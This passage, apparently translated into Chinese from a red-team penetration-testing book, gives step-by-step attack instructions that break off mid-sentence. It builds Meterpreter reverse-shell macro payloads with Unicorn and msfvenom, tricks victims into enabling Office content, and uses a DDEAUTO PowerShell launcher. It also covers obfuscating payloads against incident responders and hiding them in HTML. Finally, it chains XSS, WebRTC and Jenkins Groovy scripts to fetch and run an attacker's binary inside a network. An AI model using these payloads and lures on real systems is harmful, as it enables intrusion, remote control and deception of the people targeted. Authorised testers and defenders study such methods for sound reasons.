确保进行正确的配置
info
创建宏
generate
如果你想为 Meterpreter 创建一个 payload ，我们可以使用像 Unicorn 这样的工具:
cd /opt/unicorn
./unicorn.py windows/meterpreter/reverse_https [your_ip] 443 macro
启动一个 Metasploit Handler
msfconsole -r ./unicorn.rc
一旦生成成功，你的 payload 将如下所示：
如你所见，这是运行一个简单的 PowerShell base64 混淆脚本。这可以帮助解决绕过一些杀毒软件，但重要的是要
确保在进行实时入侵操作之前对其进行测试。生成宏后，你可以快速创建一个 Excel 文档：
打开 Excel
转到视图选项卡(View Tab) - >宏 - >查看宏
添加一个宏名称，为 book1 配置宏，然后单击 “创建”
用生成的代码替换所有当前的宏代码
另存为 .xls（Word 97-2003）或 Excel Macro-Enabled 格式的文件
现在，每当有人打开你的文档时，他们都会收到安全警告并看到一个启用内容的按钮。 如果你可以诱导受害者点
击“启用内容”的按钮，那么你的 PowerShell 脚本将会被执行，这会弹给你一个 Empire Shell 。
如前所述，宏文件方法是一种久经考验的旧方法，因此很多受害者已经对这种攻击有了一定的认识。利用 Oﬃce 文
件的另一种思路是将我们的 payload 嵌入一个批处理文件(.bat)。但在较新版本的 Oﬃce 中，如果受害者双击 Word
文档中的 .bat 文件，对象则不会被执行。我们通常不得不试图诱导受害者使其将 .bat 文件移动到桌面并执行。
我们可以用 LuckyStrike 来以更自动化的方式完成此操作。通过使用 LuckyStrike，我们可以在工作表中使用
Payload 创建 Excel 文档，甚至可以在 Excel 文档中存储完整的可执行文件（exe），这些文件可以用 ReﬂectivePE
来触发从而在内存中运行。阅读更多关于 LuckyStrike 的内容：
https://www.shellntel.com/blog/2016/9/13/luckystrike-a-database-backed-evil-macro-generator
我想提到的用于 Oﬃce 文件执行的最后一个工具是 VBad。运行 VBad 时，必须在 Oﬃce 中启用宏，并在宏安全设置
的下拉框中选择 “信任对 VBA 项目对象模型的访问” 选项。这会允许 VBad 运行 python 代码来更改并创建宏。
VBad 会严重混淆 MS Oﬃce 文档中的 payload。它还增加了加密功能，用假密钥来迷惑应急响应团队。最重要的
是，它可以在第一次成功运行后销毁加密密钥（VBad 是一个一次性使用的恶意软件）。另一个特性是 VBad 也可以
销毁对包含有效 payload 的模块的引用，以使其从 VBA 开发者工具中不可见。这使得分析和排除故障变得更加困
难。因此，不仅很难去逆向，而且如果应急响应团队尝试分析执行的 Word 文档与原始文档，则所有密钥都将丢失。
非宏的 Oﬃce 文件 —— DDE
有时候红队攻击也是一场与时间赛跑的游戏，虽然有些可以利用的易受攻击模块效果很好，但是如果时间久了，一些
杀毒软件或者安全软件已经包含了检测的策略，那么也很难利用，所以有时候一些新发现的漏洞是更好利用的。在我
们的一次评估中，首次公布了一个名为 DDE 的全新易受攻击模块。杀毒软件或任何安全产品还尚未检测到它，因此
这是获得我们初始入口点的好方法。 虽然现在有几种安全产品可以检测 DDE ，但在某些环境中它仍然可能是一种可
行的攻击。
什么是 DDE？ 
“ Windows 提供了几种在不同的应用程序之间传输数据的方法。其中一种方法就是使用动态数据交换（DDE）协议。
DDE 协议是一组消息和指南。它在共享数据的应用程序之间发送消息，并使用共享内存在应用程序之间交换数据。
应用程序可以使用 DDE 协议进行一次性数据传输。并且应用程序也可以利用 DDE 协议来进行持续的数据交换，当新
数据可用时候，应用程序可以通过持续的数据交换来彼此发送更新。” 
[ https://msdn.microsoft.com/en-us/library/windows/desktop/ms648774(v=vs.85).aspx ]
Sensepost 的团队做了一些很棒的研究，发现 MSExcel 和 MSWord 都暴露了 DDEExecute，并且可以在不使用宏的
情况下创建代码执行。
在 Word 中：
转到“插入”选项卡 -> “快速部件” -> “字段”
选择 = 公式
右键单击：!Unexpected End of Formula 并选择 Toggle Field Codes
将 payload 替换为你的 payload：
Empire 有一个 stager ，可以自动创建 Word 文件和关联的 PowerShell 脚本。 此 stager 可以通过以下方式配置：
usestager windows/macroless_msword
资源：
https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/
除了 0day 漏洞利用（例如 https://github.com/bhdresh/CVE-2017-0199 ）之外，Word 文档中是否还有其他任何
能利用的特性呢？ 答案是肯定的。虽然我们不会在本书中介绍它。其中一个例子是 subdoc attacks。这些攻击导致
受害者向网络上的攻击服务器发出 SMB 请求，以便收集 NTLM Auth Hash（NTLM 验证哈希）。 这种攻击并不是在
所有场景里百分百生效，因为大多数公司现在阻止 SMB 相关端口连接外网。对于那些还未进行此种配置的公司，我
们可以使用 subdoc_inector 攻击来利用这种错误配置。
隐藏的加密 payload
DDEAUTO c:\windows\system32\cmd.exe “/k powershell.exe [empire payload here]”
作为红队队员，我们一直在寻求使用创造性的方法来构建我们的登陆页面，加密我们的 payload，并诱导用户点击运
行。具有类似过程的两个不同工具是 EmbededInHTML 和 demiguise。
第一个工具 EmbededInHTM，该工具的描述是“ 获取文件（任何类型的文件），加密它，并将其作为资源嵌入到
HTML 文件中，还包含模拟用户点击嵌入资源之后的自动下载进程。然后，当用户浏览 HTML 文件时，嵌入式文件
即时解密，保存在临时文件夹中，然后将文件展示给用户。这一系列过程会让用户感觉该文件像是从远程站点下载来
的。基于用户的浏览器和显示的文件类型，浏览器可以自动打开文件。”
cd /op/EmbedInHTML
python embedInHTML.py -k keypasshere -f meterpreter.xll -o index.html -w
一旦受害者访问恶意站点，弹出的窗口会提示受害者在 Excel 中打开我们的 .xll 文件。不幸的是，对于最新版本的
Excel（除非配置错误），用户需要启用加载项来执行我们的 payload 。这就需要使用你在前面学到的社会工程学技
巧了。
第二个工具是 demiguise，描述是“ 生成包含一个加密的 HTA 文件的 .html 文件。该工具的思路是，当你的目标访问
该页面时，将获取其密钥并在浏览器中动态解密 HTA 然后将其直接推送给用户。这是一种隐匿技术，可以绕过由某
些安全设备进行的的内容/文件类型的检查。但是此工具并不是为了创建优秀的 HTA 内容而设计的。在 HTA 内容方面
还有其他工具/技术可以帮助你。demiguis 希望帮助用户的是:首先让你的 HTA 进入一个环境，并且（如果你使用环
境键控）避免它被沙盒化。
python demiguise.py -k hello -c “cmd.exe /c ” -p Outlook.Application -o
test.hta
利用社会工程学攻破内网 Jenkins
作为红队队员，攻击的创造性使我们的工作非常令人兴奋。我们喜欢利用旧的漏洞利用并再次使它们焕然一新。例
如，如果你一直在进行网络评估，你就会知道，如果遇到未经身份验证的 Jenkins 应用程序（开发人员大量使用它进
行持续集成），这几乎意味着它完全敞开在你的面前。这是因为 Jenkins 具有允许 Groovy 脚本执行测试的 “特性”。
利用这个脚本控制台，我们可以使用允许 shell 访问底层系统的执行命令。
这种方法在入侵方面变得如此受欢迎的原因是几乎每家大公司都有一些 Jenkins 实例。如果想要从外部进行攻击，就
会存在一个问题：这些 Jenkins 服务都是内部托管的，无法从外部访问。
我们怎么样才能在这些服务器上远程执行代码? 在我们可以回答这个问题之前，我告诉我的团队先退后一步，用
Jenkins 构建一个副本网络进行测试。 一旦我们很好地理解了代码执行请求的功能，我们现在可以构建合适的工具来
获得远程命令执行(RCE)。
面对这种情况，我们通过使用 JavaScript 和 WebRTC（Web实时通信）的一系列步骤解决了这个问题。首先，我们
需要一个属于目标组织的受害者来访问一个我们拥有的公开网站或是我们存储了 XSS payload 的网页。一旦受害者访
问我们的公开站点，我们将在他的浏览器上执行 JavaScript 从而运行我们的恶意 payload 。
此 payload 会利用一个 Chrome / Firefox 的 “功能” ，此功能允许 WebRTC（Web实时通信）公开受害者的内网 IP
。 通过内网 IP ，我们可以推断出受害者的计算机的本地子网，以了解其公司 IP 范围。 现在，我们可以使用我们特
制的 Jenkins 漏洞利用通过 Jenkins 默认的8080端口在他们的网络范围内对每一个 IP 发起攻击（这段代码只扫描本
地 /24 ，但在一个真实的红队行动中，你可能会想把扫描范围设置的比这个大很多）。
如果你玩过 Jenkins Console shell ，你就知道它有点难搞，因此能够持续获得复杂的 PowerShell payload 可能会很
困难。 为了解决这个问题，我们为本书创建了一个名为 generateJenkinsExploit.py 的工具 ，该工具将获取任何二进
制文件，对其进行加密，并构建进行恶意攻击的 JavaScript 页面。当受害者访问我们的恶意网页时，它将获取其内网
IP 并开始将我们的漏洞利用传播到 /24 范围内的所有服务器。当它找到易受攻击的 Jenkins 服务器时，此攻击将发送
一个 Groovy 脚本的 payload 来从 internet 上抓取加密的二进制文件，将其解密为一个文件放到
C:\Users\Public\RT.exe 下，并执行 Meterpreter 二进制文件(RT.exe)。
在概念上(如下图所示)，这与服务器端请求伪造 (SSRF)非常相似，我们强制受害者的浏览器重新启动与内网 IP 的连
接。
受害者访问我们存储的 XSS 或恶意 JavaScript 的页面。
受害者的浏览器执行 JavaScript/WebRTC 以获取内网 IP 并使用 Groovy POST Payload 对本地内部网络发起攻
击。
找到一个 Jenkins 服务器后，我们的 Groovy 代码将通知 Jenkins 服务器从攻击者的服务器获取加密的 payload
，然后解密并执行二进制文件。
在这种情况下，我们下载的加密可执行文件是 Meterpreter payload。
Meterpreter 在 Jenkins 服务器上执行，然后连接到我们的攻击者 Meterpreter 服务器。
注意：最新版本的 Jenkins 中不存在此漏洞。 2.x 之前的版本在默认情况下是易受攻击的，因为它们未启用 CSRF 保护
（允许对脚本进行无验证调用），并且未启用身份验证。
完整的 Jenkins 漏洞利用实验：
我们将构建一个 Jenkins Windows 服务器，以便我们可以复现此攻击。
在本地网络上安装具有桥接接口的 Windows 虚拟机。
在 Windows 系统上，下载并安装 JAVA JDK8。
下载 Jenkins war 包:
http://mirrors.jenkins.io/war-stable/1.651.2/
启动 Jenkins :
java -jar jenkins.war
浏览器打开 Jenkins:
http://:8080/
测试 Groovy 脚本控制台:
http://:8080/script
在 THP Kali 虚拟机上利用 Jenkins：
译者注:专门为本书开发的集成了所有环境的 Kali 虚拟机，本书第一章有介绍。THP 就是 The Hacker
Playbook,本书的英文简称。 
下载 THP Jenkins 漏洞利用工具（ http://bit.ly/2IUG8cs ）。
要执行该实验，我们首先需要创建一个 Meterpreter payload：
msfvenom -p windows/meterpreter/reverse_https LHOST= LPORT=8080 -f exe > 
badware.exe
加密我们的 Meterpreter 二进制文件：
创建我们的恶意 JavaScript 页面命名为 badware.html ：
将加密的二进制和恶意 JavaScript 页面都移动到 Web 目录:
现在，在完全不同的系统上，你可以使用 Chrome 或 Firefox 浏览器访问你的攻击者网页：
http:///badware.html 。只需访问该恶意页面，你的浏览器就会通过我们的 Groovy payload，使用
JavaScript 和 POST 请求对你的内部 /24 网络经由8080端口进行攻击。当它找到一个 Jenkins 服务器时，它将导致该